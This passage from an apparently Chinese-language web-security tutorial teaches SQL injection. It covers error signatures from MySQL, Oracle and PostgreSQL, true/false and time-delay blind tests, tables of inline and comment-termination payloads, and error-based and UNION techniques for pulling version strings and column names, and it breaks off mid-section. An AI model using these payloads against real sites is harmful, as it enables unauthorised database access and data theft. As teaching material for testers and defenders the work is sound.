+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error: You have an error in your SQL syntax; check the manual that corresponds to your MYSQL server version for the right syntax to use near &#x27;&#x27;&#x27; at line 1</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Error: Unknow columns &#x27;test&#x27; in &#x27;where clause&#x27;</span><br><span class="line">如果注入的参数不是一个字符串（不需要单引号），则如上报错 </span><br></pre></td></tr></table></figure>
+
+<h4 id="2-典型的-Oracle-错误举例"><a href="#2-典型的-Oracle-错误举例" class="headerlink" title="2. 典型的 Oracle 错误举例"></a>2. 典型的 Oracle 错误举例</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">Java <span class="operator">&amp;</span> Oracle</span><br><span class="line">java.sql.SQLException: ORA<span class="number">-00933</span>: <span class="keyword">SQL</span> command <span class="keyword">not</span> properly ended <span class="keyword">at</span> oracle.jdbc.dbaccess.DBError.throwSqlException(DBError.java:<span class="number">180</span>) <span class="keyword">at</span> oracle.jdbc.ttc7.TTIoer.processError(TTIoer.java:<span class="number">208</span>)</span><br><span class="line">表明了语法上不正确的 <span class="keyword">SQL</span> 语句</span><br><span class="line"></span><br><span class="line">Error: SQLExceptionjava.sql.SQLException: ORA<span class="number">-01756</span>: quoted string <span class="keyword">not</span> properly terminated</span><br><span class="line">该错误表明 Oracle 数据库检测到 <span class="keyword">SQL</span>语句中有一个使用单引号引起来的字符串未被正确结束。（使用了单引号报错）</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">.NET <span class="operator">&amp;</span> Oracle</span><br><span class="line">ORA<span class="number">-01756</span>: quoted string <span class="keyword">not</span> properly terminated System.Web.</span><br><span class="line">HttpUnhandledException: Exception <span class="keyword">of</span> type <span class="string">&#x27;System.Web.HttpUnhandleException&#x27;</span> was thrown. <span class="comment">---&gt; System.Data.OleDb.OleDbException: ORA-01756: quoted string not properly terminted</span></span><br><span class="line">单引号报错</span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">php <span class="operator">&amp;</span> Oracle</span><br><span class="line">PHP的ociparse()函数用户准备要执行的 Oracle 语句。</span><br><span class="line">Warning: ociparse() [function.ociparse]: ORA<span class="number">-01756</span>: quoted string <span class="keyword">not</span> properly terminated <span class="keyword">in</span> <span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>a.com<span class="operator">/</span>ocitest.php <span class="keyword">on</span> line <span class="number">31</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">java.sql.SQLException: ORA<span class="number">-00907</span>: missing <span class="keyword">right</span> parenthesis atoracle.jdbc.dbaccess.DBError.throwSqlException(DBError.java:<span class="number">134</span>) <span class="keyword">at</span> oracle.jdbc.ttc7.TTloer.processError(TTloer.java:<span class="number">289</span>) <span class="keyword">at</span> oracle.jdbc.ttc7.receive(Oall7.java:<span class="number">582</span>) <span class="keyword">at</span> oracle.jdbc.ttc7.TTC7Protocol.doOall7(TTC7Protocol.java:<span class="number">986</span>)</span><br><span class="line"></span><br><span class="line">数据库报告 <span class="keyword">SQL</span> 语句中存在缺少右括号错误。很多原因会引发该错误。最常见的情况是攻击者在嵌套 <span class="keyword">SQL</span> 语句中进行注入。例如一个嵌套查询。主 <span class="keyword">SELECT</span> 语句执行括号中的另一条 <span class="keyword">SELECT</span> 语句，如果攻击者向子查询语句注入了某些内容并将后面的 <span class="keyword">SQL</span>语句注释掉那么会返回该错误。如：</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> field1, field2,</span><br><span class="line">(<span class="keyword">SELECT</span> field1 </span><br><span class="line"><span class="keyword">FROM</span> table2</span><br><span class="line"><span class="keyword">WHERE</span> something <span class="operator">=</span> [attacker contorooled variable])</span><br><span class="line"><span class="keyword">as</span> field3 </span><br><span class="line"><span class="keyword">FROM</span> table1</span><br></pre></td></tr></table></figure>
+
+<h4 id="3-PostgreSQL-错误举例"><a href="#3-PostgreSQL-错误举例" class="headerlink" title="3. PostgreSQL 错误举例"></a>3. PostgreSQL 错误举例</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">单引号报错</span><br><span class="line">Query failed: ERROR: unterminated quoted string <span class="keyword">at</span> <span class="keyword">or</span> near &quot;&#x27;&#x27;&#x27;&quot;</span><br><span class="line"></span><br><span class="line">其他常规错误，如圆括号等</span><br><span class="line">Query failed: ERROR: syntex error <span class="keyword">at</span> <span class="keyword">or</span> near &quot;&quot;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>注意识别错误代码中的函数名、错误代码等信息，并善用Google。</p>
+</blockquote>
+<h3 id="二、通过真假条件判断-SQL-注入"><a href="#二、通过真假条件判断-SQL-注入" class="headerlink" title="二、通过真假条件判断 SQL 注入"></a>二、通过真假条件判断 SQL 注入</h3><p>由于Web 应用收到数据库错误时，会做不同的处理。下面将介绍一些不直接在浏览器中显示数据库报错的示例。需要注意的是，操纵参数产生的错误，可能与SQL 注入无关。</p>
+<p>Web 应用可能对于所有的错误，均返回一个通用的错误页面。如下图为 ASP.NET的错误页面。具体的行为取决于 web 服务器的配置。</p>
+<p><img src="/assets/756886-20160926012545213-933044801-7901564.png" alt="756886-20160926012545213-933044801"></p>
+<p><strong>如果测试web 站点时发现应用始终返回默认或自定义的错误页面，就需要弄清楚该错误是不是由 SQL 注入引发的。可以通过向参数中插入不会触发应用错误的 SQL 代码来进行测试</strong></p>
+<p>举例，当我们插入单引号引发统一报错时，服务端的 SQL 查询语句为</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">FORM products</span><br><span class="line"><span class="keyword">WHERE</span> category <span class="operator">=</span> <span class="string">&#x27;[attackers control]&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>在这个例子中，我们可以猜测，我们尝试注入的是一个用单引号控制的字符串。此时尝试注入一些不会产生错误的内容。</p>
+<p><strong>永真语句： <code>’ or &#39;1&#39;=&#39;1</code></strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line">FORM products</span><br><span class="line"><span class="keyword">WHERE</span> category <span class="operator">=</span> <span class="string">&#x27;bikes&#x27;</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1&#x27;</span></span><br><span class="line">如果存在 <span class="keyword">sql</span> 注入，那么上述代码将返回 products 中的所有行</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>注入永真条件有一个缺点：查询结果会包含表中的所有记录。如果数据量过大，则会查询的时间很长，且会消耗过多的服务器资源。</p>
+</blockquote>
+<p><strong>无影响语句：<code>&#39; or &#39;1&#39;=&#39;2</code>     <code>&#39; and &#39;1&#39;=&#39;1</code></strong></p>
+<p>该方法不会对查询结果产生任何影响。</p>
+<p><strong>永假语句<code>&#39; and &#39;1&#39;=&#39;2</code></strong><br>该语句不会返回任何结果。</p>
+<blockquote>
+<p>通过对不同影响的语句产生的结果不同为对照来确认是否存在 SQL注入</p>
+</blockquote>
+<p><strong>例外：</strong>有很多原因，即使注入了一个永假条件，也可能会返回结果。</p>
+<p>​		   比如如果 SQL 语句为一个联合查询，如果注入参数只影响了查询的一部分。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> products</span><br><span class="line"><span class="keyword">WHERE</span> category <span class="operator">=</span> <span class="string">&#x27;bikes&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;2&#x27;</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span> new_products</span><br></pre></td></tr></table></figure>
+
+<h3 id="三、对字符型通过拼接字符串判断-SQL-注入-amp-识别数据库类型"><a href="#三、对字符型通过拼接字符串判断-SQL-注入-amp-识别数据库类型" class="headerlink" title="三、对字符型通过拼接字符串判断 SQL 注入&amp;识别数据库类型"></a>三、对字符型通过拼接字符串判断 SQL 注入&amp;识别数据库类型</h3><p>Oracle &amp; PostgreSQL</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www.xxx.com/sn=bikes</span><br><span class="line">www.xxx.com/sn=bi&#x27;||&#x27;kes</span><br></pre></td></tr></table></figure>
+<p>Microsoft SQL Server</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www.xxx.com/sn=bikes</span><br><span class="line">www.xxx.com/sn=bi&#x27;+&#x27;kes</span><br></pre></td></tr></table></figure>
+<p>MySQL</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">www.xxx.com/sn=bikes</span><br><span class="line">www.xxx.com/sn=bi&#x27;&#x27;kes</span><br></pre></td></tr></table></figure>
+<p>如果以上两个请求的结果相同，则很可能存在 SQL 注入漏洞</p>
+<h3 id="四、对数字型采用数据计算确认-SQL-注入"><a href="#四、对数字型采用数据计算确认-SQL-注入" class="headerlink" title="四、对数字型采用数据计算确认 SQL 注入"></a>四、对数字型采用数据计算确认 SQL 注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.a.com/a.php?id=3-1</span><br><span class="line">http://www.a.com/a.php?id=4-2</span><br><span class="line">http://www.a.com/a.php?id=5-3</span><br><span class="line">返回的结果同 id=2</span><br></pre></td></tr></table></figure>
+<p>当然，也可以通过加法执行该测试，不过。因为加号是 URI的保留字，需要进行编码。可以用<code>%2B</code>来代替+</p>
+<h3 id="五、盲注"><a href="#五、盲注" class="headerlink" title="五、盲注"></a>五、盲注</h3><h4 id="1-时间延时注入"><a href="#1-时间延时注入" class="headerlink" title="1. 时间延时注入"></a>1. 时间延时注入</h4><p>当测试是否存在 SQL 注入的时候，经常会因为各种原因无法直接确认注入的存在，可以通过对数据库注入时间延时，并检查服务器的响应是否也产生了延迟。</p>
+<blockquote>
+<p>Web 服务器虽然可以隐藏错误或数据，但必须等待数据库返回结果。</p>
+</blockquote>
+<h5 id="1-1-MSSQL"><a href="#1-1-MSSQL" class="headerlink" title="1.1 MSSQL"></a>1.1 MSSQL</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-- 引入延迟的内置命令</span><br><span class="line">WAITFOR DELAY &#x27;hours:minutes:seconds&#x27;</span><br><span class="line"></span><br><span class="line">-- 举例：</span><br><span class="line">http://www.a.com/a.aspx?uid=45;waitfor delay &#x27;0:0:5&#x27;;--</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="1-2-MySQL"><a href="#1-2-MySQL" class="headerlink" title="1.2 MySQL"></a>1.2 MySQL</h5><h6 id="1-2-1-BENCHMARK函数会将一个表达式执行许多次"><a href="#1-2-1-BENCHMARK函数会将一个表达式执行许多次" class="headerlink" title="1.2.1 BENCHMARK函数会将一个表达式执行许多次"></a>1.2.1 <code>BENCHMARK</code>函数会将一个表达式执行许多次</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.a.com/a.php?id=32;SELECT BENCHMARK(10000000,ENCODE(&#x27;hello,&#x27;mom&#x27;));--</span><br></pre></td></tr></table></figure>
+
+<h6 id="1-2-2-SLEEP函数"><a href="#1-2-2-SLEEP函数" class="headerlink" title="1.2.2 SLEEP函数"></a>1.2.2 <code>SLEEP</code>函数</h6><blockquote>
+<p>添加sleep(N)这个函数后，语句的执行具体会停留多长时间取决于满足条件的记录数.如果记录数是 0，则不停留</p>
+</blockquote>
+<p>由于MySQL的条件优先级的不同，在不同语句中执行sleep()函数导致的延迟时间（执行次数）不同，一个比较简单的判断就是，判断sleep()函数所在的点，进行数据查询时需要对比的数据记录数，即等于sleep()函数执行的次数。</p>
+<h5 id="1-3Oracle-PL-x2F-SQL"><a href="#1-3Oracle-PL-x2F-SQL" class="headerlink" title="1.3Oracle PL&#x2F;SQL"></a>1.3Oracle PL&#x2F;SQL</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">BEGIN</span><br><span class="line">DBMS_LOCK.SLEEP(5);</span><br><span class="line">END;</span><br><span class="line">-- 只有数据库管理员才能使用 DBMS_LOCK</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dbms_pipe.receive_message(&#x27;RDS&#x27;, 10)</span><br><span class="line">-- 可以用在 SQL 语句中的函数。推荐用这个函数</span><br><span class="line">http://www.a.com/a.php?id=32 or 1=dbms_pipe.receive_message(&#x27;RDS&#x27;, 10)</span><br></pre></td></tr></table></figure>
+
+<h5 id="1-4-PostgreSQL"><a href="#1-4-PostgreSQL" class="headerlink" title="1.4 PostgreSQL"></a>1.4 PostgreSQL</h5><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>www.a.com<span class="operator">/</span>a.php?id<span class="operator">=</span><span class="number">32</span>;<span class="keyword">SELECT</span> pg_sleep(<span class="number">10</span>);<span class="comment">--</span></span><br><span class="line"><span class="comment">-- 需要 8.2及以上版本	</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h3 id="七、注入测试-POC-汇总"><a href="#七、注入测试-POC-汇总" class="headerlink" title="七、注入测试 POC 汇总"></a>七、注入测试 POC 汇总</h3><h5 id="1-内联注入-poc-汇总"><a href="#1-内联注入-poc-汇总" class="headerlink" title="1. 内联注入 poc 汇总"></a>1. 内联注入 poc 汇总</h5><p>内联注入是指向查询注入一些 SQL 代码后，原来的查询仍然会全部执行。</p>
+<p><strong>字符串内联注入</strong></p>
+<table>
+<thead>
+<tr>
+<th>测试字符串</th>
+<th>变形</th>
+<th>预期结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>‘</td>
+<td></td>
+<td>触发错误。如果成功，数据库将返回一个错误</td>
+</tr>
+<tr>
+<td>1’ OR ‘1’&#x3D;’1</td>
+<td>1’)or(‘1’&#x3D;’1</td>
+<td>永真条件。如果成功，将返回表中的所有行</td>
+</tr>
+<tr>
+<td>1’ or ‘1’&#x3D;’2</td>
+<td>1’)or(‘1’&#x3D;’2</td>
+<td>空条件。如果成功，将返回与原来的值相同的结果</td>
+</tr>
+<tr>
+<td>1’ and ‘1’&#x3D;’2</td>
+<td>1’)and(‘1’&#x3D;’2</td>
+<td>永假条件。如果成功，将不返回表中的任何行</td>
+</tr>
+<tr>
+<td>1’ or ‘ab’&#x3D;’a’+’b</td>
+<td>1’)or(‘ab’&#x3D;’a’+’b</td>
+<td>SQL Server 字符串连接。永真条件。</td>
+</tr>
+<tr>
+<td>1’ or ‘ab’&#x3D;’a’’b</td>
+<td>1’)or(‘ab’&#x3D;’a’’b</td>
+<td>MySQL字符串连接。永真条件</td>
+</tr>
+<tr>
+<td>1’ or ‘ab’&#x3D;’a’&amp;#x7c;&amp;#x7c;’b</td>
+<td>1’)or(‘ab’&#x3D;’a’&amp;#x7c;&amp;#x7c;’b</td>
+<td>Oracle 字符串连接。永真条件</td>
+</tr>
+</tbody></table>
+<p><strong>数字值内联注入</strong></p>
+<table>
+<thead>
+<tr>
+<th>测试字符串</th>
+<th>变形</th>
+<th>预期结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>‘</td>
+<td></td>
+<td>触发错误。如果成功，数据库将返回一个错误</td>
+</tr>
+<tr>
+<td>3-1</td>
+<td>1+1</td>
+<td>如果成功，将返回与操作结果相同的值</td>
+</tr>
+<tr>
+<td>1 or 1&#x3D;1</td>
+<td>1)or(1&#x3D;1</td>
+<td>永真条件。如果成功将返回表中所有的行</td>
+</tr>
+<tr>
+<td>1 or 1&#x3D;2</td>
+<td>1)or(1&#x3D;2</td>
+<td>空条件，如果成功，将返回与原来的值相同的结果</td>
+</tr>
+<tr>
+<td>1 and 1&#x3D;2</td>
+<td>1)and(1&#x3D;2</td>
+<td>永假条件。如果成功，将不返回任何行</td>
+</tr>
+<tr>
+<td>1 or ‘ab’&#x3D;’a’+’b’</td>
+<td>1)or(‘ab’&#x3D;’a’+’b’</td>
+<td>SQL Server 字符串拼接。永真条件</td>
+</tr>
+<tr>
+<td>1 OR ‘ab’&#x3D;’a’’b’</td>
+<td>1)or(‘ab’&#x3D;’a’’b’</td>
+<td>Mysql 字符串拼接。永真条件</td>
+</tr>
+<tr>
+<td>1 OR ‘ab’&#x3D;’a’&amp;#x7c;&amp;#x7c;’b’</td>
+<td>1)or(‘ab’&#x3D;’a’&amp;#x7c;&amp;#x7c;’b’</td>
+<td>Oracle 字符串拼接。永真条件</td>
+</tr>
+</tbody></table>
+<h5 id="2-终止式-SQL-注入-POC-汇总"><a href="#2-终止式-SQL-注入-POC-汇总" class="headerlink" title="2. 终止式 SQL 注入 POC 汇总"></a>2. 终止式 SQL 注入 POC 汇总</h5><table>
+<thead>
+<tr>
+<th>测试字符串</th>
+<th>变形</th>
+<th>预期结果</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>admin&#39;--</code></td>
+<td><code>admin&#39;)--</code></td>
+<td></td>
+</tr>
+<tr>
+<td>admin’#</td>
+<td><code>admin&#39;)#</code></td>
+<td></td>
+</tr>
+<tr>
+<td><code>1--</code></td>
+<td><code>1)--</code></td>
+<td></td>
+</tr>
+<tr>
+<td><code>1 or 1=1--</code></td>
+<td><code>1)or1=1--</code></td>
+<td></td>
+</tr>
+<tr>
+<td><code>&#39; or &#39;1&#39;=&#39;1&#39;--</code></td>
+<td><code>&#39;) or &#39;1&#39;=&#39;1&#39;--</code></td>
+<td></td>
+</tr>
+<tr>
+<td><code>-1 and 1=2--</code></td>
+<td><code>-1) and 1=2--</code></td>
+<td></td>
+</tr>
+<tr>
+<td><code>&#39;and&#39;1&#39;=2--</code></td>
+<td><code>&#39;)and&#39;1&#39;=2--</code></td>
+<td></td>
+</tr>
+<tr>
+<td><code>1/**/</code></td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<h2 id="0x03-SQL注入的进一步利用"><a href="#0x03-SQL注入的进一步利用" class="headerlink" title="0x03 SQL注入的进一步利用"></a>0x03 SQL注入的进一步利用</h2><h3 id="一、获取数据库信息"><a href="#一、获取数据库信息" class="headerlink" title="一、获取数据库信息"></a>一、获取数据库信息</h3><h4 id="1-通过报错获取数据库信息"><a href="#1-通过报错获取数据库信息" class="headerlink" title="1. 通过报错获取数据库信息"></a>1. 通过报错获取数据库信息</h4><h5 id="1-1-利用类型转换报错"><a href="#1-1-利用类型转换报错" class="headerlink" title="1.1 利用类型转换报错"></a>1.1 利用类型转换报错</h5><p>当我们发送类似于<code>0/@@version</code>作为注入代码时，除法运算需要两个数字作为操作数，所以数据库尝试将<code>@@version</code>函数的结果转换成数字。当该操作失败时，数据库会显示出变量的内容。</p>
+<p>举例：</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>www.test.com<span class="operator">/</span>a.aspx?a<span class="operator">=</span>bikes<span class="string">&#x27; and 1=0/@@version;--</span></span><br><span class="line"><span class="string">http://www.test.com/a.aspx?a=bikes&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">0</span><span class="operator">/</span><span class="keyword">user</span>;<span class="comment">--</span></span><br><span class="line"></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>www.test.com<span class="operator">/</span>a.asp?id<span class="operator">=</span>@<span class="variable">@version</span></span><br><span class="line"><span class="comment">-- 应用程序希望id字段为数字，当传递给他的是@@version字符串。执行该查询时，SQL Server会忠实的接收@@version的值并尝试将其转换为证书。此时，会报错。</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--字符型</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>www.test.com<span class="operator">/</span>a.asp?name<span class="operator">=</span><span class="string">&#x27;%2B@@version%2B&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="1-2-利用SQL方言的差异确认数据库"><a href="#1-2-利用SQL方言的差异确认数据库" class="headerlink" title="1.2 利用SQL方言的差异确认数据库"></a>1.2 利用SQL方言的差异确认数据库</h5><h6 id="1-2-1-利用字符串拼接差异来推断"><a href="#1-2-1-利用字符串拼接差异来推断" class="headerlink" title="1.2.1 利用字符串拼接差异来推断"></a>1.2.1 利用字符串拼接差异来推断</h6><table>
+<thead>
+<tr>
+<th>数据库服务器</th>
+<th>查询</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MSSQL</td>
+<td>SELECT ‘some’+’string’</td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td>SELECT ‘some’ ‘string’<br />SELECT CONCAT(‘some’,’string’)</td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td>SELECT ‘some’&amp;#x7c;&amp;#x7c;’string’<br />SELECT CONCAT(‘some’,’string’)</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td>SELECT ‘some’&amp;#x7c;&amp;#x7c;’string’<br />SELECT CONCAT(‘some’,’string’)</td>
+</tr>
+</tbody></table>
+<h6 id="1-2-2-从数字函数推断服务器版本"><a href="#1-2-2-从数字函数推断服务器版本" class="headerlink" title="1.2.2 从数字函数推断服务器版本"></a>1.2.2 从数字函数推断服务器版本</h6><p>假如没有可用的易受攻击的字符串参数，则可以使用与数字参数类似的技术。执行一条特定技术的SQL语句，经过计算后他能成为一个数字。以下表格中的计算结果都是整数。</p>
+<table>
+<thead>
+<tr>
+<th>数据库服务器</th>
+<th>查询</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>MSSQL</td>
+<td>@@pack_received<br />@@rowcount</td>
+</tr>
+<tr>
+<td>MySQL</td>
+<td>Connection_id()<br />last_insert_id()<br />row_count()</td>
+</tr>
+<tr>
+<td>Oracle</td>
+<td>BITAND(1,1)</td>
+</tr>
+<tr>
+<td>PostgreSQL</td>
+<td>SELECT EXTRACT(DOW FROM NOW())</td>
+</tr>
+</tbody></table>
+<h6 id="1-2-3-利用不同数据库的sleep函数确认服务器版本"><a href="#1-2-3-利用不同数据库的sleep函数确认服务器版本" class="headerlink" title="1.2.3 利用不同数据库的sleep函数确认服务器版本"></a>1.2.3 利用不同数据库的sleep函数确认服务器版本</h6><p>[时间延时注入](#1. 时间延时注入)</p>
+<h6 id="1-2-4-MySQL获取准确版本的技巧"><a href="#1-2-4-MySQL获取准确版本的技巧" class="headerlink" title="1.2.4 MySQL获取准确版本的技巧"></a>1.2.4 MySQL获取准确版本的技巧</h6><p><code>/* */</code>是Mysql的注释字符。如果在注释的开头加一个感叹号并在后面跟上数据库版本编号，那么该注释将被解析成代码，只要数据库版本高于或等于注释中的版本编号，代码就会执行。举例：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT 1 /*!40119 + 1*/</span><br><span class="line">-- 如果MySQL版本为4.01.19或更高版本，则返回 2</span><br><span class="line">-- 如果小于该版本，则返回 1</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="1-3-利用-GROUP-BY-amp-HAVING-获取数据库字段信息"><a href="#1-3-利用-GROUP-BY-amp-HAVING-获取数据库字段信息" class="headerlink" title="1.3 利用 GROUP BY &amp; HAVING 获取数据库字段信息"></a>1.3 利用 GROUP BY &amp; HAVING 获取数据库字段信息</h5><p>这里将 HAVING 子句与 GROUP BY 子句结合使用。也可以在 SELECT 语句中使用 HAVING 子句过滤 GROUP BY返回的记录。GROUP BY 要求 SELECT 语句选择的字段是某个聚合函数的结果或者包含在 GROUP BY 子句中。如果该条件不满足，那么数据库会返回一个错误，显示出该问题的第一列。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.test.com/a.aspx?a=bikes&#x27; having &#x27;1&#x27;=&#x27;1</span><br><span class="line">获取第一列列名 products.productid</span><br><span class="line"></span><br><span class="line">继续利用获取所有的列</span><br><span class="line">http://www.test.com/a.aspx?a=bikes&#x27; GROUP BY productid having &#x27;1&#x27;=&#x27;1</span><br><span class="line">返回「products.name」</span><br><span class="line"></span><br><span class="line">http://www.test.com/a.aspx?a=bikes&#x27; GROUP BY productid,name having &#x27;1&#x27;=&#x27;1</span><br><span class="line">返回「products.price」</span><br><span class="line"></span><br><span class="line">枚举出所有的列名吼，可以继续使用上面的类型转换错误来检索列对应的值</span><br><span class="line">http://www.test.com/a.aspx?a=bikes&#x27; and 1=0/name;--</span><br><span class="line"></span><br><span class="line">将已经发现的列加入到否定条件中，从而获取其他的列</span><br><span class="line">http://www.test.com/a.aspx?a=bikes&#x27; and name not in (&#x27;diyilie&#x27;) and 1=0/name and &#x27;1&#x27;=&#x27;1</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="二、使用UNION语句提取数据"><a href="#二、使用UNION语句提取数据" class="headerlink" title="二、使用UNION语句提取数据"></a>二、使用UNION语句提取数据</h3><p><strong>UNION语法</strong></p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">column</span><span class="number">-1</span>,<span class="keyword">column</span><span class="number">-2</span>,...,<span class="keyword">column</span><span class="operator">-</span>N <span class="keyword">FROM</span> <span class="keyword">table</span><span class="number">-1</span></span><br><span class="line"><span class="keyword">UNION</span><span class="operator">/</span><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="keyword">column</span><span class="number">-1</span>,<span class="keyword">column</span><span class="number">-2</span>,...,<span class="keyword">column</span><span class="operator">-</span>N <span class="keyword">FROM</span> <span class="keyword">table</span><span class="number">-2</span></span><br><span class="line"><span class="comment">-- UNION去重且排序，UNION ALL不去重不排序。</span></span><br><span class="line"><span class="comment">-- UNION ALL的执行速度会快一些.</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>UNION的要求</strong></p>
+<ul>
+<li>两个查询返回的列数必须相同</li>
+<li>两个SELECT语句对应列所返回的数据类型必须相同(或至少是兼容的)</li>
+</ul>
+<p>如果无法满足上述两个约束条件，则查询会返回一个错误。</p>
+<h4 id="1-获取准确的列数"><a href="#1-获取准确的列数" class="headerlink" title="1. 获取准确的列数"></a>1. 获取准确的列数</h4><h5 id="1-1-通过order-by获取列数"><a href="#1-1-通过order-by获取列数" class="headerlink" title="1.1 通过order by获取列数"></a>1.1 通过<code>order by</code>获取列数</h5><p>ORDER BY 子句可以接受一个列名作为参数，也可以接受一个数字作为参数。可以通过增大order by自剧中代表列的数字来识别查询中的列数（建议用二分法）。</p>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>www.a.com<span class="operator">/</span>a.asp?id<span class="operator">=</span><span class="number">12</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">1</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>www.a.com<span class="operator">/</span>a.asp?id<span class="operator">=</span><span class="number">12</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>www.a.com<span class="operator">/</span>a.asp?id<span class="operator">=</span><span class="number">12</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="1-2-通过联合查询获取准确列数"><a href="#1-2-通过联合查询获取准确列数" class="headerlink" title="1.2 通过联合查询获取准确列数"></a>1.2 通过联合查询获取准确列数</h5><p><strong>通过union查询，逐渐增大列数，直到查询正确执行。则可以直到列数。</strong></p>
+<blockquote>
+<p>对于大多数服务器，NULL值会被转换成任意数据类型</p>
+</blockquote>
+<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http:<span class="operator">/</span><span class="operator">/</span>www.a.com<span class="operator">/</span>a.asp?id<span class="operator">=</span><span class="number">12</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span><span class="comment">--</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>www.a.com<span class="operator">/</span>a.asp?id<span class="operator">=</span><span class="number">12</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span><span class="comment">--</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span>www.a.com<span class="operator">/</span>a.asp?id<span class="operator">=</span><span class="number">12</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span><span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 直到不返回错误为止。</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>Oracle是个例外</strong></p>
+<p>Oracle要求每个SELECT查询都要包含一个FROM属性，因此，如果是Oracle数据库，则要改成如下格式</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.a.com/a.asp?id=12 union select null from dual--</span><br><span class="line"></span><br><span class="line">-- dual是一个所有用户都能访问的表。</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-匹配数据类型并读取数据库信息"><a href="#2-匹配数据类型并读取数据库信息" class="headerlink" title="2. 匹配数据类型并读取数据库信息"></a>2. 匹配数据类型并读取数据库信息</h4><h5 id="2-1-匹配数据类型"><a href="#2-1-匹配数据类型" class="headerlink" title="2.1 匹配数据类型"></a>2.1 匹配数据类型</h5><p>识别出准确的列后，那么需要寻找需要的数据类型。比如想提取字一个字符串值(数据库用户等)，那么则需要数据库类型为字符串的列。通过使用NULL很容易实现。</p>
+<p>比如，目标原始查询一共只有4列</p>
